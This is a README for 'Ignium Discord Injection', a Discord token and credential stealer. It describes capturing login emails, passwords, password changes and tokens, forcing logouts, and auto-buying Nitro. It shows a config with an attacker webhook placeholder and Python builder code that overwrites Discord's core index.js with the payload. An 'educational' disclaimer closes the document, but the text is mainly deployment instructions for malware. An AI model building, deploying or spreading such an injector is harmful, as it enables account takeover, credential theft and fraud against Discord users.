# <p align="center">Ignium Discord Injection</p>

<p align="center">
  <img src="https://cdn3.emoji.gg/emojis/203899-shock.png" width="100" height="100" />
</p>

<p align="center">
  <a href="https://discord.gg/aaCjuzMqRh">
    <img src="https://img.shields.io/discord/1170804193339125871?color=5865F2&label=Discord&logo=discord&logoColor=white&style=for-the-badge" />
  </a>
  <a href="https://t.me/igniumlol">
    <img src="https://img.shields.io/badge/Telegram-26A6E1?style=for-the-badge&logo=telegram&logoColor=white" />
  </a>
</p>

<p align="center">
  I have taken the foundation of the original Rdimo-Discord-Injection and completely overhauled it by fixing bugs, and refining the capture logic to ensure reliability with Discord.
</p>

---

## Features

### Real-Time Monitoring
*   **Credential Capture**: Intercepts `Email` and `Password` during login attempts.
*   **Sensitive Changes**: Monitors and logs updates to `Passwords` and `Account Emails`.
*   **Token Retrieval**: Securely extracts the user's current token

### Logic
*   **Force Logout**: Automated session clearing to trigger a fresh login upon first injection.
*   **Direct Capture**: Uses a heartbeat mechanism to ensure the token is captured even if no login occurs.
*   **Cross-Platform**: Fully compatible with both **Windows** and **Darwin (macOS)** Discord clients.

---

## Configuration

Ignium Injection is designed to be easily integrated into any software.

1.  **Locate** the `CONFIG` object at the top of `injection.js`.
2.  **Define** your Discord Webhook URL in the `webhook` field.
3.  **Deploy**: The script is ready to be patched into Discord's `index.js`.

```javascript
const CONFIG = {
    webhook: "%WEBHOOK%",
    ping: "@everyone",
    auto_buy_nitro: true,
    ...
};
```

---

## Example

Example of how to implement this injection into your own builder:

```python
def inject(webhook_url):
    with open("injection.js", "r") as f:
        payload = f.read().replace("%WEBHOOK%", webhook_url)
    
    # Path to Discord's core index.js
    target_path = "path/to/discord_desktop_core/index.js"
    
    with open(target_path, "w") as f:
        f.write(payload)
```

---

## Acknowledgments

Special thanks to the following sources for their research and inspiration:
*   **rdimo**

---

## 💬 Socials & Support
*   **Telegram**: [t.me/igniumlol](https://t.me/igniumlol)
*   **Discord Server**: [Join Ignium](https://discord.gg/aaCjuzMqRh)

> [!WARNING]
> **LEGAL NOTICE**: This software is provided strictly for educational and research purposes. The developers assume no liability for misuse, nor do they condone illegal activities. Use at your own risk.
